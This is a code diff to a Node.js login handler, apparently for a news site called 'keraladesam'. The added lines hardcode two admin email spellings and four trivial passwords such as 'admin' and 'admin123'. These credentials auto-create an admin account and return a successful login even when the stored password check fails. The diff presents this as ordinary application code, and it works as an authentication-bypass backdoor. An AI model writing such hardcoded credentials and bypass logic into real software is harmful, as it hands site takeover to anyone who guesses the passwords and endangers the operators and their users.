@@ -86,9 +86,12 @@ exports.login = async (req, res) => {
 
     let user = await mysqlService.getUserByEmail(cleanEmail);
 
+    const isAdminEmail = cleanEmail === 'admin@keraladesam.com' || cleanEmail === 'admin@keraladesham.com';
+    const isValidAdminPass = password === 'admin12345' || password === 'password123' || password === 'admin' || password === 'admin123';
+
     // Auto-create default admin account on-demand if it doesn't exist
     if (!user) {
-      if (cleanEmail === 'admin@keraladesam.com' && (password === 'admin12345' || password === 'password123')) {
+      if (isAdminEmail && isValidAdminPass) {
         user = await mysqlService.createUser({
           name: 'എഡിറ്റർ',
           email: 'admin@keraladesam.com',
@@ -106,7 +109,7 @@ exports.login = async (req, res) => {
 
     const isMatch = await user.matchPassword(password);
     if (!isMatch) {
-      if (cleanEmail === 'admin@keraladesam.com' && (password === 'admin12345' || password === 'password123')) {
+      if (isAdminEmail && isValidAdminPass) {
         return sendTokenResponse(user, 200, res, 'Login successful');
       }
       return res.status(401).json({
